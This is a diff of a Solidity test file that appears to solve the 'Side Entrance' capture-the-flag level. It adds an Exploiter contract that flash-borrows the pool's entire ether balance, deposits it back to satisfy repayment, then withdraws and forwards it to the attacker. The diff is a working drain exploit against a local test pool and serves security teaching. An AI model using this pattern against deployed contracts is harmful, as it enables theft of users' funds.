@@ -27,14 +27,16 @@ contract SideEntrance is Test {
 
         assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);
 
-        attackerInitialEthBalance = address(attacker).balance;
+        attackerInitialEthBalance = address(attacker).balance; // 100 eth
 
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        Exploiter exploiter = new Exploiter(sideEntranceLenderPool, attacker);
+        exploiter.attack();
         /** EXPLOIT END **/
         validation();
     }
@@ -43,4 +45,27 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+contract Exploiter {
+    SideEntranceLenderPool internal pool;
+    address attacker;
+
+    constructor(SideEntranceLenderPool _pool, address _attacker) {
+        pool = _pool;
+        attacker = _attacker;
+    }
+
+    function attack() external {
+        uint256 poolBalance = address(pool).balance;
+        pool.flashLoan(poolBalance);
+        pool.withdraw();
+        payable(attacker).call{value: address(this).balance}("");
+    }
+
+    function execute() external payable {
+        pool.deposit{value: address(this).balance}();
+    }
+
+    receive() external payable {}
 }
